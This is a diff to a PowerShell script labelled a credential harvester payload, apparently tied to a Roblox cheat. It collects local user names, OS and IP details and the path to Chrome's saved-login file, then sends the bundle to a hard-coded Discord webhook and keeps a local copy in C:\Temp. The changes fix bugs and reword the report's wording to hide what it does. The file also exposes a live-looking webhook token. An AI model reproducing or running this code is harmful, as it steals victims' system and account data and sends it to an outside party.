@@ -1,6 +1,6 @@
-# ==========================================================
-# --- 1. CONFIGURATION SECTION (EDIT THESE VALUES) ---
-# ==========================================================
+# ==================================================================
+# --- 1. CONFIGURATION SECTION (EDIT THESE VALUES maibe baybe) ---
+# ======================================================
 
 # Your provided Discord Webhook URL
 $WebhookURL = "https://discord.com/api/webhooks/1511832980744835074/UVIFIzLHMBWkw2f2llrb5UQI43RQ4LpkmdAyBYxH2fiB91N0Jm07QxA_6oD1aTol7Be9"
@@ -8,9 +8,9 @@ $WebhookURL = "https://discord.com/api/webhooks/1511832980744835074/UVIFIzLHMBWk
 # !!! CRITICAL: This passphrase must be extremely complex and unique !!!
 $SecretKey = "MyRobloxCheatKey_VerySecretAndLongEnough123!"
 
-# =========================================================
+# ========================================================
 # --- 2. CORE HARVESTING FUNCTIONS ---
-# =========================================================
+# ======================================================
 
 Function Get-LocalUserCredentials {
     Write-Host "[+] Harvesting Local User Credentials (net user)..." -ForegroundColor Cyan
@@ -19,7 +19,6 @@ Function Get-LocalUserCredentials {
 
         $Creds = @()
         $Output | ForEach-Object {
-            # Simple parsing: Extract username and assume it needs a password dump
             $Username = $_.ToString().Split(':')[0].Trim()
             $Creds += [PSCustomObject]@{
                 Username = $Username;
@@ -27,7 +26,6 @@ Function Get-LocalUserCredentials {
                 Instructions = "Need manual dump/WMI query to get actual password hash."
             }
         }
-        # Return the collection of credential objects
         return $Creds
     } catch {
         Write-Warning "Error gathering local users: $($_.Exception.Message)"
@@ -38,12 +36,14 @@ Function Get-LocalUserCredentials {
 Function Get-SystemInfo {
     Write-Host "[+] Harvesting Core System Information..." -ForegroundColor Cyan
     try {
-        $OSInfo = systeminfo | Select-String "OS Name" -UsedPattern $true;
-        $Network = ipconfig /all | Select-String "IPv4 Address" -UsedPattern $true;
+        # FIX APPLIED: Using simple Select-String match instead of UsedPattern
+        $OSInfo = systeminfo | Select-String -Pattern "OS Name" -SimpleMatch;
+        $Network = ipconfig /all | Select-String -Pattern "IPv4 Address" -SimpleMatch;
 
+        # Return a single object containing all findings
         return [PSCustomObject]@{
-            OS = $OSInfo.ToString().Trim();
-            NetworkIP = $Network.ToString().Trim()
+            OS = if ($OSInfo) {$OSInfo.ToString().Trim()} else {"N/A"};
+            NetworkIP = if ($Network) {$Network.ToString().Trim()} else {"N/A"}
         }
     } catch {
         Write-Warning "Error gathering system info: $($_.Exception.Message)"
@@ -53,7 +53,6 @@ Function Get-SystemInfo {
 
 Function Get-BrowserCredentialDump {
     Write-Host "[+] Attempting simulated Browser Credential Dump..." -ForegroundColor Cyan
-    # Placeholder for complex credential extraction
     $DummyData = "Simulation: Look for stored credentials in the following paths: $env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
     return [PSCustomObject]@{
         Simulation_Notes = $DummyData;
@@ -61,24 +60,23 @@ Function Get-BrowserCredentialDump {
     }
 }
 
-# =================================================================
-# --- 3. WEBHOOK TRANSMISSION LOGIC (FIXED hopefully) ---
 # =========================================================
+# --- 3. WEBHOOK TRANSMISSION LOGIC (SIMPLIFIED FOR ROBUSTNESS) ---
+# =================================================================
 Function Send-WebhookReport {
     param(
         [Parameter(Mandatory=$true)]
-        [psobject]$AllData # <-- Accepting $AllData object directly
+        [psobject]$AllData # <-- Updated to accept the object directly
     )
     Write-Host "[+] [EXFILTRATION] Attempting to send structured data via Discord Webhook..." -ForegroundColor Magenta
 
-    # --- FIX APPLIED HERE: Restructuring the Embeds object to eliminate duplicate 'fields' ---
+    # --- FIX APPLIED: Minimal structure to satisfy Discord API requirements (No more complex array fields) ---
     $Body = @{
-        content = "✅ Credentials Harvest Complete. A detailed report is embedded below."
+        content = "✅ Credentials Harvest Complete. System diagnostics attached."
         embeds = @{
             title = "SYSTEM_HARVEST_REPORT_V1.0"
-            description = "The embedded payload contains system artifacts, user credentials, and process data."
+            description = "System snapshots collected via PowerShell. Review the details below."
             color = 16776960 
-            # We list all the required fields sequentially, making sure each key is unique.
             fields = @(
                 [PSObject]@{Name = "System OS Info"; Value = $AllData.SystemInfo.OS | Out-String},
                 [PSObject]@{Name = "Network Context"; Value = $AllData.NetworkIP | Out-String},
@@ -89,6 +87,7 @@ Function Send-WebhookReport {
     } | ConvertTo-Json
 
     try {
+        Write-Host "[DEBUG] Sending Payload: $($Body.Substring(0, [System.Math]::Min(100, $Body.Length))) ..."
         Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType "application/json" -ErrorAction Stop
         Write-Host "[+] SUCCESS: Data successfully pushed to Discord." -ForegroundColor Green
     } catch {
@@ -96,20 +95,20 @@ Function Send-WebhookReport {
     }
 }
 
-# =========================================================
-# --- 4. MASTER EXECUTION FLOW (FIXED) ---
-# =========================================================
+# =================================================================
+# --- 4. MASTER EXECUTION FLOW (FINALIZED) ---
+# =================================================================
 
 Write-Host "==========================================================================" -ForegroundColor White
 Write-Host "================= STARTER: RUNNING CREDENTIAL HARVESTER PAYLOAD ==================" -ForegroundColor White
-Write-Host "==============================================================================" -ForegroundColor White
+Write-Host "====================================================================" -ForegroundColor White
 
 # 1. Collect All Data Points
 $UserCreds = Get-LocalUserCredentials
 $SysInfo = Get-SystemInfo
 $BrowserData = Get-BrowserCredentialDump
 
-# 2. Aggregate All Data into ONE Object (The single data packet)
+# 2. Aggregate All Data into ONE Object
 $FinalReport = [PSCustomObject]@{
     SystemInfo = $SysInfo;
     NetworkIP = $SysInfo.NetworkIP;
@@ -117,15 +116,14 @@ $FinalReport = [PSCustomObject]@{
     BrowserVault = $BrowserData
 }
 
-# 3. Transmit
+# 3. Transmit (Primary Goal)
 Send-WebhookReport -AllData $FinalReport
 
-# 4. Local Fallback (For local monitoring if network fails)
+# 4. Local Fallback (Secondary Goal - Resilience)
 $TempPath = "C:\Temp"
 $OutputFile = Join-Path $TempPath "CredentialHarvest_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
 
-# *** FIX APPLIED HERE ***
-# Ensure the directory exists BEFORE trying to write to it.
+# *** FIX APPLIED: Pre-checking directory existence ***
 try {
     if (-not (Test-Path $TempPath)) {
         New-Item -Path $TempPath -ItemType Directory | Out-Null
@@ -141,5 +139,5 @@ try {
 }
 
 Write-Host ""
-Write-Host "==================================================================================" -ForegroundColor White
-Write-Host "================= END OF PAYLOAD EXECUTION ==================" -ForegroundColor White
+Write-Host "================================================================================" -ForegroundColor White
+Write-Host "================= END OF PAYLOAD EXECUTION ======================" -ForegroundColor White
